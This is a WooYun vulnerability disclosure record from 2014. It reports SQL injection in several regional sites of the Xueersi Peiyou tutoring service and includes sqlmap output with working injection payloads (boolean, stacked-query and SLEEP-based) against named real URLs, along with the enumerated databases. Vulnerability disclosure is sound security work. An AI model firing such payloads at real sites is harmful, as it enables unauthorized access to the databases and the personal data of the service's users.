{"id": 51311, "wybug_id": "wooyun-2014-075014", "wybug_title": "学而思培优多个分站存在SQL注入漏洞", "wybug_corp": "好未来集团学而思培优", "wybug_author": "浮萍", "wybug_date": "2014-09-04 15:10", "wybug_open_date": "2014-10-19 15:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向公众公开  简要描述：  详细说明：  学而思培优http://www.speiyou.com/\n\n看北京站名师\n\n\n\n输入'\n\n注入点http://sbj.speiyou.com/classes/view/ff80808144b18acb0144ba2ad1a33047\ncustom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] y[13:41:31] [INFO] resuming back-end DBMS 'mysql'[13:41:31] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://sbj.speiyou.com:80/classes/view/ff80808144b18acb0144ba2ad1a33047' AND 2597=2597 AND 'fYit'='fYit    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: http://sbj.speiyou.com:80/classes/view/ff80808144b18acb0144ba2ad1a33047'; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://sbj.speiyou.com:80/classes/view/ff80808144b18acb0144ba2ad1a33047' AND SLEEP(5) AND 'LRMS'='LRMS---\n\n\n   漏洞证明：  郑州站注入点zz.speiyou.com/classes/view/ff808081459884930145b150d8783bea\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://zz.speiyou.com:80/classes/view/ff808081459884930145b150d8783bea' AND 1558=1558 AND 'AvFI'='AvFI    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: http://zz.speiyou.com:80/classes/view/ff808081459884930145b150d8783bea'; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://zz.speiyou.com:80/classes/view/ff808081459884930145b150d8783bea' AND SLEEP(5) AND 'gvKf'='gvKf---\n数据库\navailable databases [3]:[*] information_schema[*] test[*] xxgl\n----------------------天津站http://stj.speiyou.com/teachers/view/ff80808132060bfd013208e4940803b6\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://stj.speiyou.com:80/teachers/view/ff80808132060bfd013208e4940803b6' AND 3975=3975 AND 'rikm'='rikm    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://stj.speiyou.com:80/teachers/view/ff80808132060bfd013208e4940803b6' AND SLEEP(5) AND 'eyTn'='eyTn---\n数据库\navailable databases [3]:[*] information_schema[*] test[*] xxgl\nxxgl数据库有532张表\n\n--------------上海站http://ssh.speiyou.com/teachers/view/ff80808132e3cf5b0132f1f20bad0fae\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://ssh.speiyou.com:80/teachers/view/ff80808132e3cf5b0132f1f20bad0fae' AND 6654=6654 AND 'wtnx'='wtnx    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: http://ssh.speiyou.com:80/teachers/view/ff80808132e3cf5b0132f1f20bad0fae'; SELECT SLEEP(5)--    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://ssh.speiyou.com:80/teachers/view/ff80808132e3cf5b0132f1f20bad0fae' AND SLEEP(5) AND 'Jtry'='Jtry---\n\navailable databases [3]:[*] information_schema[*] test[*] xxgl\nxxgl有540张表\n\n-----------------剩余的站不测试了\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-04 16:57 厂商回复： 感谢支持，我们正在修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-24 22:24 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  洞主输个单引号就能判断注入？    \n     2014-09-25 08:07 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @U神 大U神，我没那神功啊，当然判断后祭出神(sql)器(map)来进一步判断。    \n     2014-09-25 09:18 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @U神 - - 楼主是大神。 这个错误页面很正常 根本看不出来有问题    \n     2014-09-25 09:29 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @乐乐、 乐乐大神也开始白话我了  我错了 下次我一定不这样写了    \n     2014-09-25 09:35 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @浮萍 - - 你可以这样写  “直觉告诉我这里一定有问题，然后我把URL放到SQLMAP里跑，果然，我的直觉没有错。”  :-D    \n     2014-09-25 09:43 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  @乐乐、 记住了 直觉很重要    \n     2014-10-05 02:04 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  我看的时候根本没想是注入…洞主直觉太赞    \n     2014-10-06 09:47 |    \t\tnzk1912 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 软件开发8年了，也来挖挖漏洞，为创建安全...)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}